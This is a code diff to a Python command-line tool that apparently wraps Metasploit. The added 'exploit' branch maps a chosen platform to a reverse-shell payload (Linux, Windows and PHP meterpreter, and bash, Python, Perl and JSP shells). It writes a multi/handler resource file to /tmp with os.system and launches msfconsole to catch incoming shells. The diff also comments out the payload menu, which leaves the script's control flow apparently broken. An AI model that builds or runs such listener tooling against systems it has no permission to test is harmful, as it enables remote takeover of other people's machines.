@@ -88,9 +88,38 @@ elif stdin == "help":
 	print("Use the command 'payloads' to see the available Payloads")
 #################################################################
 elif stdin == "exploit":
-	print("Honestly I am not showing you here how to Exploit :-P")
-	print("I will show you just how to set up the Listener <3")
-	print("""
+	lport = input("Local Port: ")
+	platform = input("platform: ")
+	if platform == "linux":
+		payload = "linux/x86/meterpreter/reverse_tcp"
+	elif platform == "windows":
+		payload = "windows/meterpreter/reverse_tcp"
+	elif platform == "macosx":	
+		payload = "osx/x86/shell_reverse_tcp"
+	elif platform == "php":
+		payload = "php/meterpreter_reverse_tcp"
+	elif platform == "python":	
+		payload = "cmd/unix/reverse_python"
+	elif platform == "perl":
+		payload = "cmd/unix/reverse_perl"
+	elif platform == "bash":
+		payload = "cmd/unix/reverse_bash"
+	elif platform == "jsp":
+		payload = "java/jsp_shell_reverse_tcp"
+	handler = "use multi/handler\n"
+	handler += "set payload {0}\n".format(payload)
+	handler += "set lhost 0.0.0.0\n"
+	handler += "set lport {0}\n".format(lport)
+	handler += "set ExitOnSession false\n"
+	handler += "exploit -j\n"
+	handler_create = os.system("echo \"{0}\" > /tmp/handler.rc".format(handler))
+	launch_listener = os.system("msfconsole -r /tmp/handler.rc")
+	
+#################################################################
+##
+#	print("Honestly I am not showing you here how to Exploit :-P")
+#	print("I will show you just how to set up the Listener <3")
+#	print("""
 		##############################
 		# use exploit/multi/handler  #
 		##############################
@@ -101,9 +130,9 @@ elif stdin == "exploit":
 		##############################
 		# exploit                    #
 		##############################
-		""")
-elif stdin == "payloads":
-	print("""
+#		""")
+#elif stdin == "payloads":
+#	print("""
 ################################
 # linux: Linux Reverse TCP     #
 # windows: Windows Reverse TCP #
@@ -117,7 +146,7 @@ elif stdin == "payloads":
 # bash: BASH Reverse TCP       #
 # perl: Perl Reverse TCP       #
 ################################
-		""")
+#		""")
 else:
 	print("[!] Command not Found [!]")
 	print("[+] Use 'help' command [+]")
